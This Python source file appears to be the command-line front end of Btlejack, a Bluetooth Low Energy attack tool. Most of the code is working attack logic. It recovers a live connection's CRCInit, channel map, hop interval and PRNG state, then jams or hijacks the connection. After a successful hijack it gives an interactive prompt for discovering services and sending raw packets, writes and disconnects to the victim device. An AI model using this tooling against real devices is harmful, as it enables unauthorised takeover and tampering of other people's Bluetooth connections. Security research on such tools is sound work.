import signal
import sys

from time import time
from threading import Thread, Lock
from halo import Halo

from .supervisors import ConnectionRecovery, AccessAddressSniffer, ConnectionSniffer
from .pcap import PcapBleWriter, PcapNordicTapWriter, PcapBlePHDRWriter
from .helpers import bytes_to_bd_addr

from .dissect.att import *
from .dissect.l2cap import *

from .version import VERSION

class ForcedTermination(Exception):
    def __init__(self):
        super().__init__()

class SnifferUpgradeRequired(Exception):
    def __init__(self):
        super().__init__()

class PromptThread(Thread):
    """
    Interactive Prompt class
    """

    def __init__(self, supervisor):
        super().__init__()
        self.supervisor = supervisor

        self.services = []
        self.discovering_services = False
        self.service = 0
        self.discovering_characs = False

        self.reading = False
        self.writing = False

        self.lock = Lock()
        self.canceled = False


    def prompt(self):
        self.lock.acquire()
        sys.stdout.write('btlejack> ')
        sys.stdout.flush()
        self.lock.release()
        command = input()
        self.dispatch_command(command)

    def do_disconnect(self, parameters):
        """
        Disconnect from target.
        """
        self.supervisor.send_packet(
            bytes([0x03, 0x02, 0x02, 0x13])
        )
        # kill prompt
        self.canceled = True

    def do_ll(self, parameters):
        """
        Send BLE LL packets
        """
        if len(parameters) >= 1:
            try:
                payload = bytes(bytearray.fromhex(parameters[0]))
                self.supervisor.send_packet(
                    payload
                )
            except:
                sys.stdout.write('\nInvalid hex data\n')

    def do_write_cmd(self, parameters):
        """
        Write command
        """
        if len(parameters) >= 3:
            handle = int(parameters[0], 16)
            write_type = parameters[1].lower().strip()
            if write_type.lower() == 'int':
                value = pack('<I', int(parameters[2]))
            elif write_type.lower() == 'str':
                value = bytes(parameters[2], 'utf-8')
            elif write_type.lower() == 'hex':
                value = bytes(bytearray.fromhex(parameters[2]))
            payload = L2CAP(ATT(WriteCommand(
                handle,
                value
            ))).to_bytes()
            self.supervisor.send_packet(
                bytes([0x02, len(payload)]) + payload
            )
        else:
            sys.stdout.write('\nYou must specify a valid data type (int, str)\n')

    def do_write(self, parameters):
        if len(parameters) >= 3:
            handle = int(parameters[0], 16)
            write_type = parameters[1].lower().strip()
            if write_type.lower() == 'int':
                value = pack('<I', int(parameters[2]))
            elif write_type.lower() == 'str':
                value = bytes(parameters[2], 'utf-8')
                #print(value)
            elif write_type.lower() == 'hex':
                try:
                  value = bytes(bytearray.fromhex(parameters[2]))
                except:
                  sys.stdout.write('\nInvalid hex data\n')
                  return
            payload = L2CAP(ATT(WriteRequest(
                handle,
                value
            ))).to_bytes()
            self.supervisor.send_packet(
                bytes([0x02, len(payload)]) + payload
            )

        else:
            sys.stdout.write('\nYou must specify a valid data type (int, str)\n')

    def do_read(self, parameters):
        """
        Perform read on a value handle
        """
        if len(parameters) >= 1:
            handle = int(parameters[0], 16)
            payload = L2CAP(ATT(ReadRequest(handle))).to_bytes()
            self.reading = True
            self.supervisor.send_packet(
                bytes([0x02, len(payload)]) + payload
            )
        else:
            sys.stdout.write('\nhelp: read <handle>\n')

    def do_mtu(self, parameters):
        if len(parameters) >= 1:
            size = int(parameters[0])
            payload = L2CAP(ATT(ExchangeMtuRequest(size))).to_bytes()
            self.supervisor.send_packet(
                bytes([0x02, len(payload)]) + payload
            )
        else:
            sys.stdout.write('\nYou must specify an mtu size\n')

    def do_discover(self, parameters):
        """
        Discover services
        """
        self.discovering_services = True
        self.services = []
        payload = L2CAP(ATT(ReadByGroupTypeRequest(1, 0xffff, PrimaryServicesUUID()))).to_bytes()
        self.supervisor.send_packet(
            bytes([0x02, len(payload)]) + payload
        )

    def _services_discover_next(self, response):
        """
        Parse service discovery response
        """
        for service in response.attr_datas:
            start, end = unpack('<HH', service[:4])
            print('start: %04x end: %04x' % (start,end))
            uuid = UUID(service[4:])
            self.services.append(
                {
                    'start_handle': start,
                    'end_handle': end,
                    'uuid': uuid,
                    'characteristics':{}
                }
            )
        if end == 0xffff:
            self._services_discovered()
        else:
            payload = L2CAP(ATT(ReadByGroupTypeRequest(end+1, 0xffff, PrimaryServicesUUID()))).to_bytes()
            self.supervisor.send_packet(
                bytes([0x02, len(payload)]) + payload
            )

    def _services_discovered(self):
        """
        Display discovered services
        """
        self.discovering_services = False

        # Start discovering characteristics
        self.discovering_characs = True
        self.service = 0
        self.start_handle = self.services[self.service]['start_handle']
        self.end_handle = self.services[self.service]['end_handle']

        # send characteristic discovery for first service
        payload = L2CAP(ATT(ReadByTypeRequest(self.start_handle, self.end_handle, GATTCharacteristicDeclaration()))).to_bytes()
        self.supervisor.send_packet(
            bytes([0x02, len(payload)]) + payload
        )

    def _services_charac_discovered(self, response):
        """
        Parse and add discovered characteristic(s) to current service
        """
        for charac in response.attr_datas:
            handle, properties, value_handle = unpack('<HBH', charac[:5])
            uuid = UUID(charac[5:])
            self.services[self.service]['characteristics'][handle] = {
                'handle': handle,
                'properties': properties,
                'value': value_handle,
                'uuid': uuid
            }
            self.start_handle = handle

        # Ask for more
        payload = L2CAP(ATT(ReadByTypeRequest(self.start_handle+1, self.end_handle, GATTCharacteristicDeclaration()))).to_bytes()
        self.supervisor.send_packet(
            bytes([0x02, len(payload)]) + payload
        )


    def _services_charac_next(self, response):
        """
        Next service to discover
        """
        self.service += 1
        if self.service >= len(self.services):
            # we are done !
            self.discovering_characs = False
            sys.stdout.write('\r Discovered services:\n')
            # print our results
            for service in self.services:
                print('Service UUID: %s' % service['uuid'])
                for charac in service['characteristics']:
                    c = service['characteristics'][charac]
                    prop = c['properties']
                    prop_s = ''
                    if prop & (1<<1) == (1<<1):
                        prop_s += 'read '
                    if prop & (1<<2) == (1<<2):
                        prop_s += 'write_without_resp '
                    if prop & (1<<3) == (1<<3):
                        prop_s += 'write '
                    if prop & (1<<4) == (1<<4):
                        prop_s += 'notify '
                    if prop & (1<<5) == (1<<5):
                        prop_s += 'indicate '
                    if prop & (1<<6) == (1<<6):
                        prop_s += 'authenticated '
                    print(' Characteristic UUID: %s' % str(c['uuid']))
                    print('   | handle: %04x' % c['handle'])
                    print('   | properties: %s (%02x)' % (prop_s, prop))
                    print('   \ value handle: %04x' % c['value'])
                    print('')
        else:
            self.start_handle = self.services[self.service]['start_handle']
            self.end_handle = self.services[self.service]['end_handle']
            payload = L2CAP(ATT(ReadByTypeRequest(self.start_handle, self.end_handle, GATTCharacteristicDeclaration()))).to_bytes()
            self.supervisor.send_packet(
                bytes([0x02, len(payload)]) + payload
            )


    def on_ll_packet(self, packet):
        """
        Display packet.
        """
        try:
            if self.discovering_services:
                # Parse primary services tuples
                response = L2CAP.from_bytes(packet.data[12:]).payload.payload
                if isinstance(response, ErrorResponse):
                    self._services_discovered()
                elif isinstance(response, ReadByGroupTypeResponse):
                    self._services_discover_next(response)
                else:
                    self._services_discover_error()
            elif self.discovering_characs:
                # Parse answer
                response = L2CAP.from_bytes(packet.data[12:]).payload.payload
                if isinstance(response, ErrorResponse):
                    self._services_charac_next(response)
                elif isinstance(response, ReadByTypeResponse):
                    self._services_charac_discovered(response)
                else:
                    #self._services_charac_discover_error()
                    print(response.payload.payload)
            elif self.reading:
                response = L2CAP.from_bytes(packet.data[12:]).payload.payload
                if isinstance(response, ErrorResponse):
                    self.reading = False
                    sys.stdout.write('\r>> Error while reading\nbtlejack> ')
                elif isinstance(response, ReadResponse):
                    self.reading = False
                    value = response.value
                    value_hex = ' '.join(['%02x' % c for c in value])
                    sys.stdout.write('\rread>> %s\nbtlejack> ' % value_hex)
            else:
                pkt = packet.data[10:]
                pkt_hex = ' '.join(['%02x' % c for c in pkt])
                sys.stdout.write('\r>> %s\nbtlejack> '%pkt_hex)
        except L2CAPException as l2cap_error:
            # We got here because we caught something that is not L2CAP, that means
            # the connection is encrypted, so we have to notice the user in consequence
            sys.stdout.write('\r[!] Bad L2CAP packet received, connection must be encrypted.')

    def dispatch_command(self, command):
        words = command.split(' ')
        while '' in words:
            words.remove('')
        if len(words) > 0:
            command = words[0].lower()
            if hasattr(self, 'do_%s' % command):
                method = getattr(self, 'do_%s' % command)
                if method is not None and callable(method):
                    method(words[1:])
            else:
                sys.stdout.write('\nCommand not found\n')

    def cancel(self):
        self.canceled = True

    def run(self):
        while not self.canceled:
            self.prompt()
        self.supervisor.hijack_done()

class CLIAccessAddressSniffer(AccessAddressSniffer):

    def __init__(self, devices=None, output=None, verbose=None):
        super().__init__(devices=devices)
        self.output = output
        self.verbose = verbose

        # Display sniffer version
        major,minor = [int(v) for v in VERSION.split('.')]
        version = self.interface.get_version()
        if major != version[0] and minor != version[1]:
            print(' -!!!- You must update the firmware of this sniffer -!!!-')
            raise SnifferUpgradeRequired()

        print('[i] Enumerating existing connections ...')

    def on_ll_packet(self, packet):
        """
        Called when a BLE LL packet is captured.
        """
        pass

    def on_verbose(self, packet):
        """
        Called when a verbose packet is received from the sniffer.
        """
        if self.verbose:
            print('> '+ str(packet))

    def on_debug(self, packet):
        """
        Called when a debug packet is received from the sniffer.
        """
        print('D:'+str(packet))

class CLIConnectionSniffer(ConnectionSniffer):
    """
    New connection sniffer.
    """
    def __init__(self, bd_address='ff:ff:ff:ff:ff:ff', devices=None, output=None, verbose=False, timeout=0):
        super().__init__(bd_address, devices=devices)
        self.verbose = verbose
        self.output = output

        major,minor = [int(v) for v in VERSION.split('.')]
        versions = self.interface.get_version()
        print('[i] Detected sniffers:')
        for i, version in enumerate(versions):
            print(' > Sniffer #%d: version %d.%d' % (i, version[0], version[1]))
            if (major == version[0] and (minor > version[1])) or (major > version[0]):
                print(' -!!!- You must update the firmware of this sniffer -!!!-')
                raise SnifferUpgradeRequired()

    def on_connection(self, inita, adva, crc_init, interval, increment, channel_map, timeout):
        print('[i] Got CONNECT_REQ packet from %s to %s' % (
            bytes_to_bd_addr(inita),
            bytes_to_bd_addr(adva)
        ))
        print(' |-- Access Address: 0x%08x' % self.access_address)
        print(' |-- CRC Init value: 0x%06x' % crc_init)
        print(' |-- Hop interval: %d' % interval)
        print(' |-- Hop increment: %d' % increment)
        print(' |-- Channel Map: %02x%02x%02x%02x%02x' % (
            channel_map[4],
            channel_map[3],
            channel_map[2],
            channel_map[1],
            channel_map[0]
        ))
        print(' |-- Timeout: %d ms' % (timeout * 10) )
        print('')

    def on_ll_packet(self, packet):
        """
        A BLE LL packet has been captured.
        """
        timestamp = time()
        ts_sec = int(timestamp)
        ts_usec = int((timestamp - ts_sec)*1000000)
        if self.output is not None:

            # Is it a Nordic Tap output format ?
            if isinstance(self.output, PcapNordicTapWriter) or isinstance(self.output, PcapBlePHDRWriter):
                self.output.write_packet(ts_sec, ts_usec, self.access_address, packet.data)
            else:
                self.output.write_packet(ts_sec, ts_usec, self.access_address, packet.data[10:])

        pkt_hex = ' '.join(['%02x' % c for c in packet.data[10:]])
        print('LL Data: ' + pkt_hex)


    def on_hijacking_success(self):
        """
        Hijacking was successful, hijacker now owns this connection.
        """
        pass

    def on_hijacking_failed(self):
        """
        Could not hijack this connection.
        """
        pass

    def on_verbose(self, packet):
        """
        Called when a verbose packet is received from the sniffer.
        """
        if self.verbose:
            print('> '+ str(packet.message))

    def on_connection_lost(self):
        """
        Connection lost.
        """
        print('[!] Connection lost, sniffing again...')
        self.sniff()


class CLIConnectionRecovery(ConnectionRecovery):
    """
    CLI Connection recovery class.
    """

    def __init__(self, access_address, channel_map=None, crc=None, hop_interval=None, devices=None, baudrate=115200, hijack=False, jamming=False, output=None, debug=False, verbose=False, timeout=0, v5=False):
        super().__init__(
            access_address,
            channel_map=channel_map,
            crc=crc,
            hop_interval=hop_interval,
            devices=devices,
            baudrate=baudrate,
            timeout=timeout,
            v5=v5
        )
        self.output = output
        self.debug = debug
        self.verbose = verbose

        self._jamming = jamming
        self._hijack = hijack
        self._pt = None
        self.v5 = v5

        # Display sniffers version
        major,minor = [int(v) for v in VERSION.split('.')]
        versions = self.interface.get_version()
        print('[i] Detected sniffers:')
        for i, version in enumerate(versions):
            print(' > Sniffer #%d: fw version %d.%d' % (i, version[0], version[1]))
            if (major == version[0] and (minor > version[1])) or (major > version[0]):
                print(' -!!!- You must update the firmware of this sniffer -!!!-')
                raise SnifferUpgradeRequired()

        print('')
        print('[i] Synchronizing with connection 0x%08x ...' % access_address)
        #self.spinner = Spinner('Computing CRCInit value')
        if crc is None:
            self.spinner = Halo(text='Computing CRCInit value', spinner='line')
        elif channel_map is not None:
            print('✓ CRCInit: 0x%006x' % crc)
            print('✓ Channel map is provided: 0x%010x' % self.chm)
            if self.v5 and hop_interval:
                # if csa2 is selected and chm and hop_interval provided, then solve prng
                print('✓ Hop interval is provided: %d' % self.hop_interval)
                self.spinner = Halo('Recovering PRNG internal counter', spinner='line')
                #self.spinner.start()
                #self.interface.recover_prng(self.access_address, self.crc, self.chm, self.hop_interval)
            else:
                self.spinner = Halo(text='Computing hop interval', spinner='line')
        else:
            print('✓ CRCInit: 0x%006x' % crc)
            self.spinner = Halo(text='Determining channel map', spinner='line')
        self.spinner.start()
        self.access_address = access_address

    def on_verbose(self, packet):
        """
        Called when a verbose packet is received from the sniffer.
        """
        if self.verbose:
            print('@> '+ str(packet.message))

    def on_debug(self, packet):
        """
        Called when a debug packet is received from the sniffer.
        """
        print('D:'+str(packet))

    def on_crc(self, crc):
        """
        Connection CRC has been recovered.
        """
        self.crc = crc
        self.spinner.stop_and_persist(
            symbol='✓'.encode('utf-8'),
            text='CRCInit = 0x%06x'%crc
        )
        if self.chm_provided:
            print('✓ Channel map is provided: 0x%010x' % self.chm)
            #print(self.v5)
            if self.v5:
                # Skip hop cchm ...
                self.on_chm(self.chm)
            else:
                self.spinner.text = 'Computing hop interval'
                self.spinner.start()
                self.interface.recover_hop(self.access_address, self.crc, self.chm)
        else:
            self.spinner.text = 'Determining channel map'
            self.spinner.start()

    def on_chm(self, chm):
        """
        Channel map has been recovered.
        """
        self.chm = chm
        self.spinner.stop_and_persist(
            symbol='✓'.encode('utf-8'),
            text='Channel Map = 0x%010x'%chm
        )
        if self.hop_provided:
            print('✓ Hop interval is provided: %d' % self.hop_interval)
            self.spinner.text = 'Computing hop increment'
            self.spinner.start()
        else:
            # If version 5 is required, we don't need to ask the firmware
            # to recover the hop interval.
            #print(self.v5)
            if not self.v5:
                self.spinner.text = 'Computing hop interval'
                self.spinner.start()
                self.interface.recover_hop(self.access_address, self.crc, self.chm)
            else:
                self.spinner.text = 'Computing hop interval'
                self.spinner.start()

                #self.spinner.text = 'Recovering CSA2 PRNG state'
                #self.spinner.start()
                #self.interface.recover_prng(self.access_address, self.crc, self.chm, 160)

    def on_hopinterval(self, interval):
        """
        Hop interval has been recovered.
        """
        self.spinner.stop_and_persist(
            symbol='✓'.encode('utf-8'),
            text='Hop interval = %d'%interval
        )
        if self.v5:
            self.spinner.text = 'Recovering PRNG internal counter'
            self.spinner.start()
            self.interface.recover_prng(self.access_address, self.crc, self.chm, interval)
        else:
            self.spinner.text = 'Computing hop increment'
            self.spinner.start()

    def on_hopincrement(self, increment):
        """
        Hop increment has been recovered.
        """
        self.spinner.stop_and_persist(
            symbol='✓'.encode('utf-8'),
            text='Hop increment = %d'%increment
        )
        if self._hijack:
            print('[i] Synchronized, hijacking in progress ...')
            self.hijack()
        elif self._jamming:
            print('[i] Synchronized, jamming in progress ...')
            self.jam()
        else:
            print('[i] Synchronized, packet capture in progress ...')

    def on_prng_state(self, state):
        """
        CSA2 PRNG State has been recovered
        """
        self.spinner.stop_and_persist(
            symbol='✓'.encode('utf-8'),
            text='CSA2 PRNG counter = %d'%state
        )
        if self._hijack:
            print('[i] Synchronized, hijacking in progress ...')
            self.hijack()
        elif self._jamming:
            print('[i] Synchronized, jamming in progress ...')
            self.jam()
        else:
            print('[i] Synchronized, packet capture in progress ...')



    def on_ll_packet(self, packet):
        """
        A BLE LL packet has been captured.
        """
        if self._pt is not None:
            self._pt.on_ll_packet(packet)
        else:
            timestamp = time()
            ts_sec = int(timestamp)
            ts_usec = int((timestamp - ts_sec)*1000000)
            if self.output is not None:
                self.output.write_packet(ts_sec, ts_usec, self.access_address, packet.data)
            pkt_hex = ' '.join(['%02x' % c for c in packet.data[10:]])
            print('LL Data: ' + pkt_hex)

    def on_hijacking_success(self):
        """
        Hijacking was successful, hijacker now owns this connection.
        """
        print('[i] Connection successfully hijacked, it is all yours \o/')
        self._pt = PromptThread(self)
        self._pt.start()

    def on_hijacking_failed(self):
        """
        Could not hijack this connection.
        """
        print('[!] Hijack failed.')

    def hijack_done(self):
        """
        Hijack terminated callback
        """
        #raise ForcedTermination()

    def on_packet_received(self, packet):
        if self._pt is not None and self._pt.canceled:
            self._pt.join()
            raise ForcedTermination()
        else:
            super().on_packet_received(packet)


    def on_connection_lost(self):
        """
        Connection lost.
        """
        # if we were hijacking, close PromptThread
        if self._pt is not None:
            # Kill prompt thread and wait for its termination.
            self._pt.cancel()
            self._pt.join()

        # Okay, we exit here.
        print('[!] Connection lost.')
        raise ForcedTermination()
